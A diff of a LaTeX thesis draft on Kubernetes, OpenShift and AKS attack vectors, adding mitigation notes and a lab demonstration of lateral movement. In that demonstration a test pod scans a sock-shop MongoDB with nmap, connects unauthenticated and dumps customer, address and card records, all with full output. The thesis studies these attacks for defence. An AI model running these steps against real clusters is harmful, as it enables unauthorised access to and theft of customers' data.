@@ -307,6 +307,14 @@ In order to give a more comprehensible picture, the scope of these vectors varie
 %TODO rename vectors - make shorter
 The following headlines will each define and explain one of the 17 identified attack vectors of this thesis. For brevity of reference, each has a Vector ID assigned which is formatted as Vxx.
 
+TODO mention these generic measures
+LOG ALL THE THINGS
+	ELK/EFK-stack or Splunk with log forwarding/aggregation (container AND nodes), k8s audit logging (k8s)
+	
+MONITORING AND ALERTING
+	prometheus, grafana (visualization), neuvector, (sysdig) falco, aqua, twistlock
+
+
 \subsection{V01 - Reconaissance through Kubernetes \& platform control plane interfaces}
 Gather information useful for further attacks through accessible: the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)
 
@@ -314,72 +322,181 @@ components: kubernetes dashboard, kubernetes apiserver, OCP web console,
 
 TODO
 
+MEASURES SAME AS V02
+
 \subsection{V02 - Read confidentials through Kubernetes \& platform control plane interfaces}
 Gather confidential information through the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)
 
 TODO
 
+DEACTIVATE OR BLOCK UNUSED INTERFACES
+	administration: uninstall / deactivate configurable interfaces , check RBAC permissions with kubiscan
+	from container: network policies blacklisting APIs/consoles
+	from company network: firewall (bad practice)
+	
+	
+LIMIT INTERFACE CAPABILITIES
+	deactivate capabilities to the highest authority level  whenever possible/applicable
+	
+SECURE ACCESS
+	no unauth, no ABAC, integrate existing RBAC you are managing anyway
+	use 2FA when possible (i.e. for dev and/or admin access to cloud) <- openstack: 2FA may be integratable to AD? TODO
+	
+FOLLOW LEAST PRIVILEGE PRINCIPLE
+	limit access to each user in their scope (possibly further - need to know principle?)
+	
+SECRETS MANAGEMENT
+	DO NOT load secrets from dockerfile / podconfig / env vars or other shit! DO use kubernetes secrets (or better: external key mgmt like hashicorp vault or azure ad pod identity / openshift vault) TODO: how to enforce?
+	
+ENABLE ALERTING
+	on events like adding admin / granting admin privs / creating namespace / touching things deemed critical. TODO: how?
+
 \subsection{V03 - Change configuration through Kubernetes \& platform control plane interfaces}
 Change the existing configuration through the Kubernetes dashboard \& apiserver as well as potential platform webinterfaces \& apiserver(s)
 TODO
+
+V06 LIMIT CAPABILITIES
+
+EVERYTHING FROM V02
 
 \subsection{V04 - Compromise internal k8s control plane components (etcd, scheduler, controller-manager)}
 This vector comprises reconaissance, leaks of confidentials and configuration changes through Kubernetes components not intended to be accessible: etcd stores, kube-scheduler and kube-controller-manager
 
 TODO
 
+CLUSTER ISOLATION
+
+FOLLOW ADDITIONAL TIPS BY SUPPLIER
+
+
 \subsection{V05 - Supply compromised container (base) image}
 Supplying a malicious container image leading to security violations on the cluster (remote access for an attacker, resource misuse, data leakage, …). Most easily done untargeted (dockerhub images or dockerfiles on tutorials/help forums), but can be done targeted, too. Additionally, an image build process typically runs as root, leading to compromise possibilities to compromise the node where an image is built from a rogue dockerfile. (TODO: provoking stale image usage to exploit vulns, too?)
 
 TODO
+
+POLICIES FOR CONTAINER IMAGES
+	Define what makes an image safe (enough) for usage. (light: only allow verified dockerhub images. Heavy: run images through a vetting process or build them from scratch)
+	Define in what intervals both policy and set of base images are reviewed
+
+RESTRICT THE SET OF POTENTIALLY USED IMAGES
+	Use a dedicated private image registry which only gets vetted images OR enforce image whitelisting from public sources (including restricting versions, only allow the ones you vetted!)
+	
+VET IMAGES BEFORE USAGE
+	Run your defined image vetting process for every container before it becomes available for use
+	Re-vet new versions before they are admitted for usage
+	scan with fossa, clair, microscanner, OPA policies
+
+RE-ASSESS ALL VERSIONS OF ALL IMAGES REGULARLY
+	regularly scan all available images in all their versions and disable images that are (or have become) vulnerable. Especially old image versions should be purged, since those can be vulnerable to well-documented exploits.
 
 \subsection{V06 - Supply compromised k8s configuration}
 Supplying a malicious kubernetes configuration leading to security violations on the cluster (remote access for an attacker, resource misuse, data leakage, …). Most easily done untargeted (tutorials/ help forums), but can be done targeted, too.
 
 TODO
 
+RAISE OPERATOR AWARENESS
+	Train operators (cluster administrators \& users) regularly									
+	Make sure that operators are aware of the risks of copy-pasting									
+										
+OTHER ORGANIZATIONAL MEASURES
+	write guidelines with good security policies (what to use by default, what exceptions could be allowed and what processes have to be followed before admitted)	
+
+LIMIT CAPABILITIES
+	K8s PodSecurityPolicies			Enable and configure global ( \& potentially additional namespace-identified) Pod Security Policies, which define default values and enforce specific settings if defined. ATTENTION: currently in preview for AKS!						
+	(openshift SCCs)			(recommentations: TODO! RunAsUser=MustRunAsNonRoot , RunAsGroup=MustRunAsNonRoot, AllowPrivilegeEscalation=false (<- careful, might break setuid binaries! Not-as-good-alternative: DefaultAllowPrivilegeEscalation=false), privileged=false)						
+										
+	restrict communication			no traffic to oder projects (OCP) or namespaces (AKS)						
+	restrict images			use private repo / dockerhub-official images only						All of these: either implemented by dev or enforced by admin. Suggestion: enforced by cluster admin (scc / networkpolicy in podsecuritypolicy) with exceptions granted when needed
+	restrict host impact			no priviledged containers, no priviledge escalation (asking to become priviledged), restrict kernel capabilities, no root containers (maybe yes, but with user namespace remapping only?), procmounttype default (apply restrictions by container runtimes in /proc), restrict mount volume types and host volume paths, (maybe use sandboxing through gvisor / kata containers?)						
+	verify with tool / 3rd party			put through kubesec.io offline/ kube-bench/ kubeaudit / kubeatf (enforce: k8guard) or 4-eyes-principle or security clearance on config changes (probably too overkill)						
+
+
 \subsection{V07 - Compromise other application components (lateral movement)}
 Once an attacker gains access to a container, he may try to access more lucrative application components or information, i.e. sniffing traffic or accessing databases or containers with more confidential information/traffic.
 
 TODO
+
+ENCRYPR CROSS-CONTAINER TRAFFIC
+	istio with mTLS for traffic encryption and signing OR guideline for devs to use TLS everywhere OR enforce with OPA?		
+			
+AUTHORIZATION/AUTHENTICATION FOR ACCESS, EVEN WITHIN
+	namespace isolation, network restriction, ...appSec problem?
 
 \subsection{V08 - Container breakout (R/W, Privilege Escalation)}
 Once inside a container, an attacker may try to gain access to the underlying host by a multitude of means. This includes invoking syscalls, accessing the host file system and elevation priviledges within or outside of the container environment
 
 TODO
 
+V06 LIMIT CAPABILITIES -> RESTRICT HOST IMPACT
+
 \subsection{V09 - Compromise local image cache}
 If the cached image of a container can be manipulated, another container (which might even seem to fulfill the same function) violating security principles could be started.
 
 TODO
+
+ENSURE IMAGE PROVENANCE
+	docker content trust, code signing
+
 
 \subsection{V10 - Modify running container}
 Once inside a container, an attacker may try to modify the container to exfiltrate data or better suit their needs for further intrusion
 
 TODO
 
+LIMIT CAPABILITIES
+	like V13, but during runtime
+
 \subsection{V11 - Hoard resources (sabotage)}
 The provided resources may be misconfigured or misused to disrupt service availability (i.e. through fork bombing or misconfiguration)
 
 TODO
+
+ISOLATION OF COMPONENTS
+	different namespaces (with different resource limits) for different parts of app, depending on criticality
+	
+LIMIT RESOURCE USAGE
+	per-app / per-namespace resource limits on CPU, Storage, RAM, Bandwidth, cloud budget, what else?
+	
+LIMIT ACCOUNT CAPABILITIES
+	least privilege for dev accounts to limit misconfiguration (i.e. to his own namespace) <- no creation of new namespaces except for within his own resource limits!
+	
+LOGGING OR MONITORING CONFIG CHANGES
+	see generic -> logging/monitoring
 
 \subsection{V12 - Misuse resources (cryptojacking)}
 The provided resources may be misconfigured or misused for financial gains (mining cryptocurrencies)
 
 TODO
 
+MEASURES SAME AS V11 EXCEPT COMPONENT ISOLATION
+
 \subsection{V13 - Add malicious container}
 A malicious container may be started within the cluster
 TODO
+
+LIMIT ADMISSION AND CAPABILITIES
+	k8s: V06 -> limit capabilities
+	container runtime: V16->additional restrictions + V17->minimal node setup
+
 
 \subsection{V14 - Add malicious node}
 A malicious node may be added to the cluster
 TODO
 
+REQUIRE ADMIN TO AUTHORIZE NODE ADD
+	Source: NIST-SP800-190, chapter 4.3.5      TODO: how to in ocp / AKS?
+
+
 \subsection{V15 - Bad user practice (outside of cluster)}
 This vector comprises user practices outside of the cluster that lead to risks within it. Examples include phishing, openly publishing keys/tokens to public code repositories and more.
 
 TODO
+
+ORGANIZATIONAL MEASURES
+	inform users \& admins of risks regarding…	
+		…phishing (classic awareness)
+		…openly publishing stuff (open source (repos), presentations, talking to external people, troubleshooting threads on stackoverflow, potential partners/vendors, …) TODO: are there infosec modules/courses/resources for this?
+
 
 %TODO: dont forget
 %default kubeconfig file location on user machine: $HOME/.kube/config <- contains certs + tokens for login, specifies which apiservers, ...
@@ -394,10 +511,45 @@ The underlying nodes could allow an attacker easy entry, even if the containers 
 %TODO: also other (external) parts of company infrastructure
 TODO
 
+"CONVENTIONAL" HARDENING
+	established resources like CIS benchmarks
+
+V17 NODE PATCH MGMT MEASURES
+
+V17 NODE MINIMAL OS MEASURES
+	
+ADDITIONAL RESTRICTIONS AVAILABLE
+	disable SSH access to hosts whenever possible (access through physical when bare-metal / hypervisor interfaces if VM nodes). If needed and risk accepted, enable ssh access through bastion host
+	close exposed ports configured, but not needed (dangling container runtime daemon?)
+	CSVS chapter: infrastructure
+	CIS Docker Benchmark chapters: Chapters 1-3 \& 5 (+ Docker Content trust)
+	CIS Kubernetes Benchmark chapters: Worker Node Security Configuration \& Configuration Files
+	NIST-SP800-190 chapters: 3.5, 4.5, 4.6
+	cloud config: check with ScoutSuite and analyze/enforce with cloud-custodian, Azure: check with azurite?
+
 \subsection{V17 - Entry through known, unpatched vulnerabilities}
 Every system has to be kept up to date with  security patches. Publicly known vulnerabilities might otherwise be exploited, leading to potentially devastating violations of security principles
 
 TODO
+
+PATCH MANAGEMENT MEASURES
+(Components: Hosts, Kubernetes cluster, containers, other cluster tools (Jenkins, …)
+	Define responsibilities for Patch Management Guidelines and their execution (while accounting for vacation time and sick days)
+	Define Patch Management Guideline(s) covering all components, I.e. when to patch, when to upgrade, when to take offline
+	Executing people: subscribe to vulnerability notification feeds or set up automated patching
+	AKS-specific: Security Updates are not rolled out automatically if that would result in downtime! Someone has to restart nodes manually or set up automated process!
+	OpenShift-specific: execute guidelines
+	Regularly assess all components for conformity with the desired state
+	Host: Conventional patch management measures
+	Kubernetes: execute guidelines
+	Container: automated scanning (i.e. with clair) or regular manual assessment, subscribe to alerts (new vulns im container images / code OR other components!)
+	
+MINIMAL SETUP	
+	Container-optimised node OS (i.e. CoreOS, Google Container-optimized OS)
+	Use mimimal base images (slim is good, alpine is better) for your containers
+	Install only tools required for the operation each specific container on the images used
+	Avoid and eliminate tool functionality overlap (i.e. you don’t need two different tools to gather the same logs, each might be at risk through vulns)
+
 
 \chapter{Assessing the attack surface risk}
 %TODO: derive process/evolution of risk rating model, introduce rating by threat actors + tools + vector + platform, explain problems / inaccuracies
@@ -794,18 +946,497 @@ TODO would start with highest vector, check possible measures and implement when
 
 \section{Managing the risk of V07 - Lateral movement from container}
 %TODO: write out all from ppt with commands, pictures
+TODO this was done in both AKS and OCP, is possible with both default configs!
 
 \subsection{Demonstrating the successful attack without security measures}
 
-TODO see powerpoint
+LATERAL MOVEMENT  OCP COMMANDS - SET STAGE
+Display projects:
+oc projects
+Lookup service ip from server (look for user-db ip) :
+oc get service -n sock-shop
+Show container used + scc’s needed for it:
+cat network-utils.yaml
+oc adm policy scc-review -z default -f network-utils.yaml
+Start container and enter it:
+oc apply -f network-utils.yaml
+oc rsh network-utils
 
+LATERAL MOVEMENT OCP SET STAGE DUMP (see latex source file here)
+\iffalse
+\begin{lstlisting}
+[root@openshiftmaster ~]# oc projects
+You have access to the following projects and can switch between them with 'oc project <projectname>':
+
+    default
+    kube-public
+    kube-system
+    management-infra
+    openshift
+    openshift-infra
+    openshift-logging
+    openshift-node
+    openshift-sdn
+    openshift-web-console
+    other-team-deployment
+    sock-shop
+  * testuser
+
+Using project "testuser" on server "https://openshiftmaster.lgr.com:8443".
+[root@openshiftmaster ~]# oc get service -n sock-shop
+NAME           TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
+carts          ClusterIP   172.30.64.220    <none>        80/TCP         17d
+carts-db       ClusterIP   172.30.43.90     <none>        27017/TCP      17d
+catalogue      ClusterIP   172.30.233.128   <none>        80/TCP         17d
+catalogue-db   ClusterIP   172.30.235.75    <none>        3306/TCP       23d
+front-end      NodePort    172.30.56.57     <none>        80:30001/TCP   23d
+orders         ClusterIP   172.30.157.45    <none>        80/TCP         17d
+orders-db      ClusterIP   172.30.11.68     <none>        27017/TCP      17d
+payment        ClusterIP   172.30.95.255    <none>        80/TCP         17d
+queue-master   ClusterIP   172.30.150.132   <none>        80/TCP         23d
+rabbitmq       ClusterIP   172.30.248.38    <none>        5672/TCP       17d
+shipping       ClusterIP   172.30.151.180   <none>        80/TCP         17d
+user           ClusterIP   172.30.124.104   <none>        80/TCP         17d
+user-db        ClusterIP   172.30.2.17      <none>        27017/TCP      17d
+[root@openshiftmaster ~]# cat network-utils.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: network-utils
+spec:
+  containers:
+    - name: network-utils
+      image: amouat/network-utils
+      command: [ "sh", "-c"]
+      args:
+        - while true; do
+            sleep 10;
+          done;
+restartPolicy: Never
+[root@openshiftmaster ~]# oc adm policy scc-review -z default -f network-utils.yaml
+RESOURCE            SERVICE ACCOUNT   ALLOWED BY
+Pod/network-utils   default           anyuid
+Pod/network-utils   default           hostmount-anyuid
+Pod/network-utils   default           hostnetwork
+[root@openshiftmaster ~]# oc apply -f network-utils.yaml
+pod/network-utils created
+[root@openshiftmaster ~]# oc rsh network-utils
+# 
+\end{lstlisting}
+\fi
+
+LATERAL MOVEMENT OCP COMMANDS
+\iffalse
+\begin{lstlisting}
+Check availability from within container (in other project) <- TODO: not feasible with -Pn?!
+nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn
+Download mongo binary, connect to db in container:
+curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz --resolve fastdl.mongodb.org:80:52.222.167.194 -O
+tar -xvf mongodb-linux-x86_64-4.0.10.tgz
+./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
+Search for interesting data:
+show dbs
+use users
+show collections
+db.customers.find()
+db.addresses.find()
+db.cards.find()
+Mitigate (as ocp system:admin, needs openshift-ovs-multitenant SDN plugin!):
+oc adm pod-network isolate-projects sock-shop
+\end{lstlisting}
+\fi
+
+LATERAL MOVEMENT OCP TEXT DUMP
+\iffalse
+\begin{lstlisting}[
+# nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2019-06-13 15:16 UTC
+Nmap scan report for 172.30.2.17
+Host is up (0.00051s latency).
+PORT      STATE SERVICE
+27017/tcp open  mongodb
+| mongodb-databases:
+|   totalSize = 229376
+|   ok = 1
+|   databases
+|     2
+|       name = users
+|       empty = false
+|       sizeOnDisk = 114688
+|     0
+|       name = admin
+|       empty = false
+|       sizeOnDisk = 49152
+|     1
+|       name = local
+|       empty = false
+|_      sizeOnDisk = 65536
+
+Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
+# curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz --resolve fastdl.mongodb.org:80:52.222.167.194 -O
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 81.0M  100 81.0M    0     0  1069k      0  0:01:17  0:01:17 --:--:-- 1614k
+# tar -xvf mongodb-linux-x86_64-4.0.10.tgz
+mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES.gotools
+mongodb-linux-x86_64-4.0.10/README
+mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES
+mongodb-linux-x86_64-4.0.10/MPL-2
+mongodb-linux-x86_64-4.0.10/LICENSE-Community.txt
+mongodb-linux-x86_64-4.0.10/bin/mongodump
+mongodb-linux-x86_64-4.0.10/bin/mongorestore
+mongodb-linux-x86_64-4.0.10/bin/mongoexport
+mongodb-linux-x86_64-4.0.10/bin/mongoimport
+mongodb-linux-x86_64-4.0.10/bin/mongostat
+mongodb-linux-x86_64-4.0.10/bin/mongotop
+mongodb-linux-x86_64-4.0.10/bin/bsondump
+mongodb-linux-x86_64-4.0.10/bin/mongofiles
+mongodb-linux-x86_64-4.0.10/bin/mongoreplay
+mongodb-linux-x86_64-4.0.10/bin/mongod
+mongodb-linux-x86_64-4.0.10/bin/mongos
+mongodb-linux-x86_64-4.0.10/bin/mongo
+mongodb-linux-x86_64-4.0.10/bin/install_compass
+# ./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
+MongoDB shell version v4.0.10
+connecting to: mongodb://172.30.2.17:27017/test?gssapiServiceName=mongodb
+WARNING: No implicit session: Logical Sessions are only supported on server versions 3.6 and greater.
+Implicit session: dummy session
+MongoDB server version: 3.4.1
+WARNING: shell and server versions do not match
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+        http://docs.mongodb.org/
+Questions? Try the support group
+        http://groups.google.com/group/mongodb-user
+Server has startup warnings:
+2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten]
+2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2019-06-12T08:05:30.285+0000 I CONTROL  [initandlisten]
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/defrag is 'always'.
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
+2019-06-12T08:05:30.286+0000 I CONTROL  [initandlisten]
+> show dbs
+admin  0.000GB
+local  0.000GB
+users  0.000GB
+> use users
+switched to db users
+> show collections
+addresses
+cards
+customers
+> db.cards.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830ae"), "longNum" : "5953580604169678", "expires" : "08/19", "ccv" : "678" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b1"), "longNum" : "5544154011345918", "expires" : "08/19", "ccv" : "958" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b4"), "longNum" : "0908415193175205", "expires" : "08/19", "ccv" : "280" }
+{ "_id" : ObjectId("57a98ddce4b00679b4a830d2"), "longNum" : "5429804235432", "expires" : "04/16", "ccv" : "432" }
+> db.customers.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830af"), "firstName" : "Eve", "lastName" : "Berger", "username" : "Eve_Berger", "password" : "fec51acb3365747fc61247da5e249674cf8463c2", "salt" : "c748112bc027878aa62812ba1ae00e40ad46d497", "addresses" : [ ObjectId("57a98d98e4b00679b4a830ad") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830ae") ] }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b2"), "firstName" : "User", "lastName" : "Name", "username" : "user", "password" : "e2de7202bb2201842d041f6de201b10438369fb8", "salt" : "6c1c6176e8b455ef37da13d953df971c249d0d8e", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b0") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b1") ] }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b5"), "firstName" : "User1", "lastName" : "Name1", "username" : "user1", "password" : "8f31df4dcc25694aeb0c212118ae37bbd6e47bcd", "salt" : "bd832b0e10c6882deabc5e8e60a37689e2b708c2", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b3") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b4") ] }
+> db.addresses.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830ad"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b0"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b3"), "number" : "4", "street" : "Maes-Y-Deri", "city" : "Aberdare", "postcode" : "CF44 6TF", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98ddce4b00679b4a830d1"), "number" : "3", "street" : "my road", "city" : "London", "country" : "UK" }
+>
+\end{lstlisting}
+\fi
+LATERAL MOVEMENT AKS COMMANDS
+
+Display projects:
+kubectl get namespace
+Lookup service ip from server (look for user-db ip) :
+kubectl get service -n sock-shop
+Show container used: 
+cat network-utils.yaml
+Start container and enter it:
+kubectl apply -f network-utils.yaml
+kubectl exec -it network-utils -- /bin/bash
+
+LATERAL MOVEMENT AKS SET STAGE DUMP
+\iffalse
+\begin{lstlisting}[
+lukas@Azure:~$ kubectl get namespace
+NAME          STATUS   AGE
+default       Active   7h
+kube-public   Active   7h
+kube-system   Active   7h
+sock-shop     Active   6h
+testuser      Active   6h
+lukas@Azure:~$ kubectl get service -n sock-shop
+NAME           TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
+carts          ClusterIP   10.0.167.221   <none>        80/TCP         6h
+carts-db       ClusterIP   10.0.199.172   <none>        27017/TCP      6h
+catalogue      ClusterIP   10.0.133.141   <none>        80/TCP         6h
+catalogue-db   ClusterIP   10.0.240.1     <none>        3306/TCP       6h
+front-end      NodePort    10.0.246.241   <none>        80:30001/TCP   6h
+orders         ClusterIP   10.0.16.21     <none>        80/TCP         6h
+orders-db      ClusterIP   10.0.119.245   <none>        27017/TCP      6h
+payment        ClusterIP   10.0.89.48     <none>        80/TCP         6h
+queue-master   ClusterIP   10.0.64.13     <none>        80/TCP         6h
+rabbitmq       ClusterIP   10.0.185.20    <none>        5672/TCP       6h
+shipping       ClusterIP   10.0.117.16    <none>        80/TCP         6h
+user           ClusterIP   10.0.69.17     <none>        80/TCP         6h
+user-db        ClusterIP   10.0.1.75      <none>        27017/TCP      6h
+lukas@Azure:~$ cat network-utils.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: network-utils
+spec:
+  containers:
+    - name: network-utils
+      image: amouat/network-utils
+      command: [ "sh", "-c"]
+      args:
+        - while true; do
+            sleep 10;
+          done;
+  restartPolicy: Neverlukas@Azure:~$
+lukas@Azure:~$ kubectl apply -f network-utils.yaml
+pod/network-utils created
+lukas@Azure:~$ kubectl exec -it network-utils -- /bin/bash
+root@network-utils:/#
+\end{lstlisting}
+\fi
+LATERAL MOVEMENT COMMANDS AKS
+\iffalse
+Check availability from within container (in other project) <- TODO: not feasible with -Pn?!
+nmap -p27017 --script mongodb-databases 172.30.2.17 -Pn
+Download mongo binary, connect to db in container:
+curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz -O
+tar -xvf mongodb-linux-x86_64-4.0.10.tgz
+./mongodb-linux-x86_64-4.0.10/bin/mongo 172.30.2.17
+Search for interesting data:
+show dbs
+use users
+show collections
+db.customers.find()
+db.addresses.find()
+db.cards.find()
+\fi
+LATERAL MOVEMENT AKS TEXT
+\iffalse
+\begin{lstlisting}
+root@network-utils:/# nmap -p27017 --script mongodb-databases 10.0.1.75 -Pn
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2019-06-17 15:36 UTC
+Nmap scan report for user-db.sock-shop.svc.cluster.local (10.0.1.75)
+Host is up (0.000071s latency).
+PORT      STATE SERVICE
+27017/tcp open  mongodb
+| mongodb-databases:
+|   databases
+|     0
+|       sizeOnDisk = 49152
+|       name = admin
+|       empty = false
+|     1
+|       sizeOnDisk = 65536
+|       name = local
+|       empty = false
+|     2
+|       sizeOnDisk = 114688
+|       name = users
+|       empty = false
+|   ok = 1
+|_  totalSize = 229376
+
+Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
+root@network-utils:/# curl fastdl.mongodb.org/linux/mongodb-linux-x86_64-4.0.10.tgz -O
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 81.0M  100 81.0M    0     0  20.6M      0  0:00:03  0:00:03 --:--:-- 20.6M
+root@network-utils:/# tar -xvf mongodb-linux-x86_64-4.0.10.tgz
+mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES.gotools
+mongodb-linux-x86_64-4.0.10/README
+mongodb-linux-x86_64-4.0.10/THIRD-PARTY-NOTICES
+mongodb-linux-x86_64-4.0.10/MPL-2
+mongodb-linux-x86_64-4.0.10/LICENSE-Community.txt
+mongodb-linux-x86_64-4.0.10/bin/mongodump
+mongodb-linux-x86_64-4.0.10/bin/mongorestore
+mongodb-linux-x86_64-4.0.10/bin/mongoexport
+mongodb-linux-x86_64-4.0.10/bin/mongoimport
+mongodb-linux-x86_64-4.0.10/bin/mongostat
+mongodb-linux-x86_64-4.0.10/bin/mongotop
+mongodb-linux-x86_64-4.0.10/bin/bsondump
+mongodb-linux-x86_64-4.0.10/bin/mongofiles
+mongodb-linux-x86_64-4.0.10/bin/mongoreplay
+mongodb-linux-x86_64-4.0.10/bin/mongod
+mongodb-linux-x86_64-4.0.10/bin/mongos
+mongodb-linux-x86_64-4.0.10/bin/mongo
+mongodb-linux-x86_64-4.0.10/bin/install_compass
+root@network-utils:/# ./mongodb-linux-x86_64-4.0.10/bin/mongo 10.0.1.75
+MongoDB shell version v4.0.10
+connecting to: mongodb://10.0.1.75:27017/test?gssapiServiceName=mongodb
+WARNING: No implicit session: Logical Sessions are only supported on server versions 3.6 and greater.
+Implicit session: dummy session
+MongoDB server version: 3.4.1
+WARNING: shell and server versions do not match
+Welcome to the MongoDB shell.
+For interactive help, type "help".
+For more comprehensive documentation, see
+        http://docs.mongodb.org/
+Questions? Try the support group
+        http://groups.google.com/group/mongodb-user
+Server has startup warnings:
+2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten]
+2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
+2019-06-17T09:26:20.304+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is 'always'.
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten] **        We suggest setting it to 'never'
+2019-06-17T09:26:20.920+0000 I CONTROL  [initandlisten]
+> show dbs
+admin  0.000GB
+local  0.000GB
+users  0.000GB
+> use users
+switched to db users
+> db.customers.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830af"), "firstName" : "Eve", "lastName" : "Berger", "username" : "Eve_Berger", "password" : "fec51acb3365747fc61247da5e249674cf8463c2", "salt" : "c748112bc027878aa62812ba1ae00e40ad46d497", "addresses" : [ ObjectId("57a98d98e4b00679b4a830ad") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830ae") ] }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b2"), "firstName" : "User", "lastName" : "Name", "username" : "user", "password" : "e2de7202bb2201842d041f6de201b10438369fb8", "salt" : "6c1c6176e8b455ef37da13d953df971c249d0d8e", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b0") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b1") ] }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b5"), "firstName" : "User1", "lastName" : "Name1", "username" : "user1", "password" : "8f31df4dcc25694aeb0c212118ae37bbd6e47bcd", "salt" : "bd832b0e10c6882deabc5e8e60a37689e2b708c2", "addresses" : [ ObjectId("57a98d98e4b00679b4a830b3") ], "cards" : [ ObjectId("57a98d98e4b00679b4a830b4") ] }
+> db.addresses.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830ad"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b0"), "number" : "246", "street" : "Whitelees Road", "city" : "Glasgow", "postcode" : "G67 3DL", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b3"), "number" : "4", "street" : "Maes-Y-Deri", "city" : "Aberdare", "postcode" : "CF44 6TF", "country" : "United Kingdom" }
+{ "_id" : ObjectId("57a98ddce4b00679b4a830d1"), "number" : "3", "street" : "my road", "city" : "London", "country" : "UK" }
+> db.cards.find()
+{ "_id" : ObjectId("57a98d98e4b00679b4a830ae"), "longNum" : "5953580604169678", "expires" : "08/19", "ccv" : "678" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b1"), "longNum" : "5544154011345918", "expires" : "08/19", "ccv" : "958" }
+{ "_id" : ObjectId("57a98d98e4b00679b4a830b4"), "longNum" : "0908415193175205", "expires" : "08/19", "ccv" : "280" }
+{ "_id" : ObjectId("57a98ddce4b00679b4a830d2"), "longNum" : "5429804235432", "expires" : "04/16", "ccv" : "432" }
+>
+\end{lstlisting}
+\fi
 \subsection{Selecting security measures}
 
-TODO dont allow privileged containers (scc in OCP, podsecuritypolicies in AKS)
+TODO use multitenant networkplugin (OCP) and network policies (k8s)
 
+
+LATERAL MOVEMENT OCP REMEDIATION DUMP
+\iffalse
+\begin{lstlisting}[
+[root@openshiftmaster ~]# oc projects
